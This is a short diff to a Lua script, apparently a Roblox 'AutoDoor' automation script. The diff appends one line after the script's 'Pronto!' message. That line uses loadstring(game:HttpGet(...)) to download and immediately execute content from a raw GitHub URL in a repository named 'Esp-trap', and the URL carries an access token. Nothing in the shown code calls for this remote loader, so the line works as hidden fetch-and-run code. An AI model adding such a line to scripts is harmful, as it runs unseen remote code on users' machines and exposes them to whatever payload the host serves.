@@ -233,3 +233,5 @@ PlayerGui.ChildAdded:Connect(function(child)
 end)
 
 print("[AutoDoor] Pronto!")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/t35617853-dotcom/Esp-trap/refs/heads/main/README.md?token=GHSAT0AAAAAADZVCD5LFJ7PUPVWTXXIVSMM2OSM4MQ"))()
